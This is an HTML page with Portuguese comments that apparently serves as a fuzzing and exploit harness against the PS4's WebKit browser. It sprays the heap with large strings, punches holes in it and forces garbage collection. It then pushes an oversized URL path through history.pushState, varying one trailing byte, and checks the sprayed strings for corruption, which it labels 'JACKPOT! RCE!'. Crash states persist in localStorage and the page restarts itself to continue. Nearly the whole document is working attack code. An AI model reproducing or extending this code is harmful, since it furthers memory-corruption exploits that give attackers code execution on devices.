<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit Fuzzer V2 (Stable Loop)</title>
    <style>
        body { background-color: #111; color: #0f0; font-family: monospace; padding: 20px; }
        .box { border: 1px solid #444; padding: 10px; margin-bottom: 10px; }
        .current { font-size: 1.5em; color: yellow; }
        .crash { color: #f55; }
        .safe { color: #888; }
        .jackpot { color: #fff; background: #d00; font-weight: bold; padding: 5px; border: 2px solid #f00; }
        button { padding: 10px 20px; cursor: pointer; background: #333; color: white; border: 1px solid #555; }
    </style>
</head>
<body>

<h2>WebKit Heap Fuzzer V2 (Stable)</h2>
<div class="box">
    <p>Status: <span id="status">Aguardando...</span></p>
    <p>URL Original: <span id="cleanUrlDisplay" style="color:#88f; font-size: 0.8em;">Detectando...</span></p>
    <button onclick="startFuzzing()">INICIAR FUZZING (0x00 - 0xFF)</button>
    <button onclick="resetFuzzing()">RESETAR TUDO</button>
</div>

<div id="log" style="height: 300px; overflow-y: scroll; border: 1px solid #333; padding: 5px; font-size: 12px;"></div>

<script>
    const MB = 1024 * 1024;
    const VICTIM_SIZE = MB; 
    const SPRAY_COUNT = 512; 
    var victims = new Array(SPRAY_COUNT);

    // --- CORREÇÃO DO LOOP: SALVAR URL LIMPA ---
    // Se a URL atual já estiver suja (contém muitos AAAA), precisamos tentar recuperar a limpa do storage
    // ou assumir que é o nome do arquivo se for a primeira vez.
    var CLEAN_URL = localStorage.getItem('clean_url');
    
    // Se não tivermos uma URL limpa salva, ou se a atual parece ser a original (curta), salvamos agora.
    if (!CLEAN_URL || window.location.href.length < 500) {
        // Remove hash ou query params extras para garantir
        CLEAN_URL = window.location.href.split('#')[0]; 
        localStorage.setItem('clean_url', CLEAN_URL);
    }
    
    document.getElementById('cleanUrlDisplay').innerText = CLEAN_URL;

    // --- LÓGICA DE LOG E PERSISTÊNCIA ---
    function logHistory(msg, color="white") {
        const el = document.getElementById('log');
        el.innerHTML += `<div style="color:${color};">${msg}</div>`;
        el.scrollTop = el.scrollHeight;
    }

    function saveState(byte, status) {
        localStorage.setItem('fuzz_byte', byte);
        localStorage.setItem('fuzz_status', status);
    }

    function appendLog(byte, result) {
        let history = localStorage.getItem('fuzz_history') || "";
        history += `[0x${byte.toString(16).toUpperCase().padStart(2,'0')}] ${result}|`;
        localStorage.setItem('fuzz_history', history);
    }

    function loadHistory() {
        let history = localStorage.getItem('fuzz_history') || "";
        if(!history) return;
        let entries = history.split('|');
        entries.forEach(entry => {
            if(entry.trim() === "") return;
            let color = entry.includes("CRASH") ? "#f55" : "#888";
            if(entry.includes("JACKPOT")) color = "#0f0";
            logHistory(entry, color);
        });
    }

    function init() {
        loadHistory();
        let savedByte = parseInt(localStorage.getItem('fuzz_byte'));
        let savedStatus = localStorage.getItem('fuzz_status');

        if (isNaN(savedByte)) savedByte = 0; 

        // DETECÇÃO DE CRASH
        if (savedStatus === 'running') {
            logHistory(`CRASH DETECTADO EM 0x${savedByte.toString(16).toUpperCase()}`, "#f55");
            appendLog(savedByte, "CRASH (Browser Closed)");
            
            savedByte++; // Pula para o próximo
            saveState(savedByte, 'idle');
        }

        document.getElementById('status').innerText = `Pronto: 0x${savedByte.toString(16).toUpperCase()}`;
    }

    function startFuzzing() {
        let currentByte = parseInt(localStorage.getItem('fuzz_byte')) || 0;
        
        if (currentByte > 255) {
            alert("Fuzzing Completo!");
            return;
        }

        saveState(currentByte, 'running');
        document.getElementById('status').innerText = `TESTANDO 0x${currentByte.toString(16).toUpperCase()}...`;
        document.getElementById('status').className = "current crash";

        runExploit(currentByte);
    }

    function resetFuzzing() {
        if(confirm("Apagar todo o histórico?")) {
            localStorage.clear();
            // Recarrega a página atual (esperando que esteja limpa, ou o usuario deve limpar a URL manualmente)
            window.location.href = window.location.pathname; 
        }
    }

    // --- O EXPLOIT ---
    function runExploit(magicByte) {
        // 1. SPRAY
        for (let i = 0; i < SPRAY_COUNT; i++) {
            let header = `ID:${i}-`; 
            let padding = "B".repeat(VICTIM_SIZE - header.length);
            victims[i] = header + padding;
        }

        // 2. HOLES
        for (let i = SPRAY_COUNT - 200; i < SPRAY_COUNT; i += 4) {
            victims[i] = null;
        }
        
        // GC Force
        for(let k=0; k<150; k++) { new ArrayBuffer(0x20000); }

        // 3. TRIGGER
        setTimeout(() => {
            const SAFE_SIZE = 709522; 
            const BASE = "A".repeat(SAFE_SIZE);
            const OVERFLOW = String.fromCharCode(magicByte); 
            
            const payload = "/" + BASE + OVERFLOW;

            try {
                // AQUI A URL MUDA PARA .../AAAAA
                history.pushState({}, "poc", payload);
                
                setTimeout(() => checkSuccess(magicByte), 100);
            } catch(e) {
                console.log(e);
            }
        }, 500);
    }

    function checkSuccess(byte) {
        let jackpot = false;

        for (let i = SPRAY_COUNT - 200; i < SPRAY_COUNT; i++) {
            if (victims[i] !== null) {
                let v = victims[i];
                if (v.length !== VICTIM_SIZE) {
                    jackpot = true;
                    break;
                }
            }
        }

        if (jackpot) {
            document.getElementById('status').innerHTML = "JACKPOT! RCE!";
            document.getElementById('status').className = "jackpot";
            appendLog(byte, "JACKPOT!!!");
            alert(`SUCESSO EM 0x${byte.toString(16)}!`);
            saveState(byte, 'idle'); 
        } else {
            // FALHA (Nada aconteceu)
            appendLog(byte, "Safe");
            let next = byte + 1;
            saveState(next, 'idle');
            
            // --- CORREÇÃO AQUI ---
            // Em vez de reload(), forçamos a URL a voltar para a CLEAN_URL
            setTimeout(() => {
                window.location.replace(CLEAN_URL); 
            }, 500);
        }
    }

    init();

    // Auto-start
    if (localStorage.getItem('fuzz_byte') > 0 && localStorage.getItem('fuzz_status') === 'idle') {
        setTimeout(startFuzzing, 1000);
    }
</script>
</body>
</html>
